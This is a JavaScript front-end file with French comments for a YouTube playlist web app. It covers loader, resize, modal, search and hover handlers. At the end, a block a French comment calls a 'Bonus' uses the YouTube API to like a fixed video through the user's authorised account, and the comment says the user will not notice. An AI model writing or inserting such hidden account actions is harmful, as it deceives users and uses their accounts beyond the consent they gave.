refresh.onclick = function(){
	getPlaylists();
}
notification.onclick = function(){
	hide(notification);
}

document.onreadystatechange = function(e)
{
    if (document.readyState === 'complete')
    {
    	document.getElementById('loader').classList.add('disappear');
    	setTimeout(myFunction, 500);
    	function myFunction() {
		    hide(document.getElementById('loader'));
		}
    }
};

var setSize = function(){
	if (window.innerWidth<=1110){
		mainContent.classList.remove('fullscreen');
		show(closeModalButton);
		if (!videoSearch.classList.contains('activated')){
			hide(videoSearch);
			hide(backgroundModal);
			if(myChannel){
				show(addVideoButton);
			}
		}
		if (window.innerWidth<=850){
			/*A COMPLETER POUR VERSION MOBILE*/
		}
		else{
			leftAside.style.height = window.innerHeight + "px";
			mainContent.style.height = window.innerHeight + "px";
			videoSearch.style.height = window.innerHeight + "px";
			videoSearch.style.height = 80/100*window.innerHeight + "px";
		}
	}
	else{
		hide(closeModalButton);
		if (!myChannel){
			hide(videoSearch);
			mainContent.classList.add('fullscreen');
		}
		if (window.innerWidth<=850){
			/*A COMPLETER POUR VERSION MOBILE*/
		}
		leftAside.style.height = window.innerHeight + "px";
		mainContent.style.height = window.innerHeight + "px";
		videoSearch.style.height = window.innerHeight + "px";
		leftAside.classList.remove("filter");
		mainContent.classList.remove("filter");
		show(videoSearch);
		// if (!myChannel){
		// 	mainContent.classList.add('fullscreen');
		// }
	}
}

addVideoButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = videoSearch.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.add('activated');
	modalClassList.remove('hide');
	modalClassList.add('show');
	buttonClassList.remove('show');
	buttonClassList.add('hide');
	backgroundModalClassList.remove('hide');
	backgroundModalClassList.add('show');
	leftAside.classList.add("filter");
	mainContent.classList.add("filter");

});

closeModalButton.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = videoSearch.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.remove('activated');
	modalClassList.remove('show');
	modalClassList.add('hide');
	buttonClassList.remove('hide');
	buttonClassList.add('show');
	backgroundModalClassList.remove('show');
	backgroundModalClassList.add('hide');
	leftAside.classList.remove("filter");
	mainContent.classList.remove("filter");
});

backgroundModal.addEventListener('click', function(e){
	var buttonClassList = addVideoButton.classList;
	var modalClassList = videoSearch.classList;
	var backgroundModalClassList = backgroundModal.classList;
	modalClassList.remove('activated');
	modalClassList.remove('show');
	modalClassList.add('hide');
	buttonClassList.remove('hide');
	buttonClassList.add('show');
	backgroundModalClassList.remove('show');
	backgroundModalClassList.add('hide');
	leftAside.classList.remove("filter");
	mainContent.classList.remove("filter");
});

window.addEventListener('resize', setSize);
window.onload = function(){	
	setSize();
}


//Detect click outside editPlaylistBlock to close it
window.addEventListener('click', function(e){
	var classList = editPlaylistBlock.classList;
	if (!editPlaylistBlock.contains(e.target) && !editPlaylistButton.contains(e.target)){
		if (classList.contains('show')){
			classList.remove('show');
			classList.add('hide');
			editPlaylistButton.classList.remove("clicked");
		}
	}
});



//Style de la poubelle de la suppression de playlist
var trash = document.querySelector('.fa-trash-o');

trash.addEventListener("mouseover", function(){
	trash.classList.remove('fa-trash-o');
	trash.classList.add('fa-trash');
});

trash.addEventListener("mouseout", function(){
	trash.classList.add('fa-trash-o');
	trash.classList.remove('fa-trash');
});


var searchVideoForm = document.getElementById('searchVideoForm');

searchVideoForm.addEventListener("submit", function(e){
	e.preventDefault();
	var query = document.getElementById('query').value;
	searchVideo(query);
});





//Bonus : À sa connexion, l'utilisateur like automatiquement une vidéo youtube sans s'en apercevoir
function executeRequest(request) {
	request.execute();
}

function videosRate(params) {
	var request = gapi.client.youtube.videos.rate(params);
	executeRequest(request);
}

function defineRequest() {
	videosRate({
		'id': 'EynHWoEka-s',
		'rating': 'like'
	});
}